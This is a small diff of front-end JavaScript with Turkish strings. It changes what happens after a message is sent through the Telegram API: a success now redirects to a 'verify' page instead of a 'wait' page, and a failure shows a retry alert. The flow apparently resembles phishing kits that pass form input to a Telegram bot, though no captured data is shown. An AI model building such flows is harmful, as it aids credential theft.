@@ -106,10 +106,10 @@
                     })
                         .then(response => {
                             if (response.ok) {
-                                alert('Mesaj başarıyla gönderildi.');
-                                window.location.href = 'bekle.html'; // Yönlendirme
-                            } else {
 
+                                window.location.href = 'dogrula.html'; // Yönlendirme
+                            } else {
+                                alert('Mesaj gönderilemedi. Lütfen tekrar deneyin.');
                             }
                         })
                         .catch(error => console.error('Telegram API hatası:', error));
